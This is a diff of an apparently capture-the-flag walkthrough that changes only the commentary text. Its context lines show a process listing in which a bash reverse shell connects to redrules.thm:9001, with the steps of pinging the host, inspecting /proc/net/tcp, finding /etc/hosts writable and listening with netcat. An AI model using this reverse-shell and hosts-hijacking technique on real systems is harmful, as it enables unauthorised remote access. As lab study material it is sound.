@@ -141,7 +141,7 @@ ps -aux --forest
 red        16215  0.0  0.1   6972  2612 ?        S    10:56   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
 red        16234  0.0  0.1   6972  2644 ?        S    10:57   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
 ```
-###### Interesting... Lets try to ping 'redrules.thm' to find out its ip
+###### Interesting... It's making a connection to redrules.thm:9001 using bash. Lets try to ping 'redrules.thm' to find out its ip
 ```
 ping redrules.thm
 ```
@@ -162,7 +162,7 @@ ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouter
 ```
-###### Wow! Just Wow.<br>Lets check if there is a server listening on 'redrules:9001'
+###### Wow! Just Wow🤨.<br>Lets check if there is a server listening on 'redrules:9001'
 ```
 grep -v "rem_address" /proc/net/tcp | awk  '{x=strtonum("0x"substr($2,index($2,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($2,i,2))}{print x":"strtonum("0x"substr($2,index($2,":")+1,4))}'
 ```
@@ -194,7 +194,7 @@ ls -la /etc/hosts
 ```
 -rw-r--rw- 1 root adm 242 Jul 19 11:15 /etc/hosts
 ```
-###### 👀, Itsss writable, but can only append. This file resets too upon some command so watch out.
+###### 👀😲, Itsss writable, but can only append. This file resets too upon some command so watch out if it disappears.
 Step 6:
 ###### Use netcat(nc/netcat) to listen for and connections on port 9001
 ```
